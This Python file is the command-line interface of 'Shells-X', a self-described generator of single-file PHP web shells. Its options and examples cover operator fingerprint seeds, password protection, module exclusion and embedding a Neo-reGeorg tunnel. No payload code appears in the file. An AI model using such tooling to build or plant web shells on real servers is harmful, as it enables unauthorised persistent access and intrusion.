"""Command-line interface — argparse setup and dispatch.

Run via the project-root ``generate.py`` wrapper, or
``python -m shellsx`` if you prefer the package form.
"""

import argparse
import sys

from .builder import build
from .fingerprint import verify_shell
from .theme import THEME_PRESETS


_USAGE_EXAMPLES = """\
Examples:
    python generate.py                                    # Default PHP build
    python generate.py --lang php --minify                # Minified output
    python generate.py --seed "op-nighthawk"              # Operator-specific fingerprint
    python generate.py --password secret123               # Password-protected shell
    python generate.py --exclude tunnel,diagnostics       # Exclude modules
    python generate.py --tunnel path/to/tunnel.php        # Embed Neo-reGeorg tunnel
    python generate.py --theme synth                      # Named color theme
    python generate.py --accent "#ff6600"                 # Custom accent color
    python generate.py --theme mono --accent "#00ff88"    # Theme + accent override
    python generate.py --output myshell.php               # Custom filename
    python generate.py --verify dist/shell_a3f8c1e2.php   # Verify integrity
"""


def _build_parser():
    parser = argparse.ArgumentParser(
        description='Shells-X — modular single-file web shell generator.',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=_USAGE_EXAMPLES,
    )
    parser.add_argument('--lang', default='php', choices=['php'],
                        help='Target language (default: php)')
    parser.add_argument('--minify', action='store_true',
                        help='Minify CSS and JS output')
    parser.add_argument('--seed', default='',
                        help='Operator seed for unique fingerprinting')
    parser.add_argument('--password', default='',
                        help='Set password protection (hash is embedded)')
    parser.add_argument('--tunnel', default='',
                        help='Path to tunnel.php')
    parser.add_argument('--exclude', default='',
                        help='Comma-separated modules to exclude (e.g. tunnel,diagnostics)')
    parser.add_argument('--output', default='',
                        help='Custom output filename')
    parser.add_argument('--theme', default=None, choices=list(THEME_PRESETS.keys()),
                        help='Color theme. Harmonious (hue-derived): cyber, matrix, amber, '
                             'synth, arctic, sodium, viridian, rust, ultra, plasma. '
                             'Legacy hand-crafted: ocean, crimson, forest, purple, mono, solar. '
                             'Omit to get a random hue.')
    parser.add_argument('--accent', default='',
                        help='Custom accent color as hex (e.g. "#ff6600")')
    parser.add_argument('--verify', default='',
                        help='Verify integrity of an existing generated shell')
    return parser


def main(argv=None):
    """Parse argv and dispatch to build / verify. ``argv`` is left as
    None in normal CLI use; tests can pass a list."""
    args = _build_parser().parse_args(argv)
    if args.verify:
        sys.exit(0 if verify_shell(args.verify) else 1)
    build(args)


if __name__ == '__main__':
    main()
